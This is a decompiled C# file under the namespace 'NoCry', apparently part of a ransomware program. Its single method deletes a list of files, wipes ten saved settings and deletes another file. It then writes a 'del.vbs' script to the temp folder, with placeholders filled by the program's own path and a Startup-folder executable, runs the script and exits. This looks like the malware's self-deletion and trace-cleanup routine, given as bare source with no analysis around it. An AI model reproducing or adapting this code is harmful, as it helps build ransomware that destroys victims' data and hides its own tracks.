using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NoCry;

namespace ns0;

[StandardModule]
internal sealed class Class9
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		StreamWriter streamWriter = default(StreamWriter);
		string text2 = default(string);
		List<string>.Enumerator enumerator = default(List<string>.Enumerator);
		string current = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 669:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0028;
						case 4:
							goto IL_0032;
						case 5:
						case 6:
							goto IL_003a;
						case 7:
							goto IL_003e;
						case 8:
							goto IL_004d;
						case 9:
							goto IL_0068;
						case 10:
							goto IL_0084;
						case 11:
							goto IL_00a0;
						case 12:
							goto IL_00bc;
						case 13:
							goto IL_00d8;
						case 14:
							goto IL_00f4;
						case 15:
							goto IL_0110;
						case 16:
							goto IL_012c;
						case 17:
							goto IL_0148;
						case 18:
							goto IL_0164;
						case 19:
							goto IL_0173;
						case 20:
						case 21:
							goto IL_0180;
						case 22:
							goto IL_018a;
						case 23:
							goto IL_019e;
						case 24:
							goto IL_01b4;
						case 25:
							goto IL_01df;
						case 26:
							goto IL_01ec;
						case 27:
							goto IL_01f8;
						case 28:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 29:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_01b4:
					num = 24;
					text = text.Replace("%startup%", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Class13.string_4 + ".exe");
					goto IL_01df;
					IL_01df:
					num = 25;
					streamWriter = new StreamWriter(text2, append: false);
					goto IL_01ec;
					IL_019e:
					num = 23;
					text = text.Replace("%path%", Application.get_ExecutablePath());
					goto IL_01b4;
					IL_01ec:
					num = 26;
					streamWriter.WriteLine(text);
					goto IL_01f8;
					IL_000a:
					num = 2;
					enumerator = Form4.listenc.GetEnumerator();
					goto IL_0017;
					IL_0017:
					if (enumerator.MoveNext())
					{
						current = enumerator.Current;
						goto IL_0028;
					}
					goto IL_003e;
					IL_01f8:
					num = 27;
					streamWriter.Close();
					break;
					IL_0028:
					num = 3;
					if (File.Exists(current))
					{
						goto IL_0032;
					}
					goto IL_003a;
					IL_0032:
					num = 4;
					File.Delete(current);
					goto IL_003a;
					IL_003a:
					num = 6;
					goto IL_0017;
					IL_003e:
					num = 7;
					((IDisposable)enumerator).Dispose();
					goto IL_004d;
					IL_004d:
					num = 8;
					Interaction.SaveSetting("P", "0", Class13.string_15, "");
					goto IL_0068;
					IL_0068:
					num = 9;
					Interaction.SaveSetting("H", "0", Class13.string_15, "");
					goto IL_0084;
					IL_0084:
					num = 10;
					Interaction.SaveSetting("M", "0", Class13.string_15, "");
					goto IL_00a0;
					IL_00a0:
					num = 11;
					Interaction.SaveSetting("S", "0", Class13.string_15, "");
					goto IL_00bc;
					IL_00bc:
					num = 12;
					Interaction.SaveSetting("X", "0", Class13.string_15, "");
					goto IL_00d8;
					IL_00d8:
					num = 13;
					Interaction.SaveSetting("D", "0", Class13.string_15, "");
					goto IL_00f4;
					IL_00f4:
					num = 14;
					Interaction.SaveSetting("T", "0", Class13.string_15, "");
					goto IL_0110;
					IL_0110:
					num = 15;
					Interaction.SaveSetting("G", "0", Class13.string_15, "");
					goto IL_012c;
					IL_012c:
					num = 16;
					Interaction.SaveSetting("F", "0", Class13.string_15, "");
					goto IL_0148;
					IL_0148:
					num = 17;
					Interaction.SaveSetting("C", "0", Class13.string_15, "");
					goto IL_0164;
					IL_0164:
					num = 18;
					if (File.Exists(Class13.string_6))
					{
						goto IL_0173;
					}
					goto IL_0180;
					IL_0173:
					num = 19;
					File.Delete(Class13.string_6);
					goto IL_0180;
					IL_0180:
					num = 21;
					text = Class6.del;
					goto IL_018a;
					IL_018a:
					num = 22;
					text2 = Path.GetTempPath() + "del.vbs";
					goto IL_019e;
					end_IL_0001_2:
					break;
				}
				num = 28;
				Process.Start(text2);
				ProjectData.EndApp();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 669;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
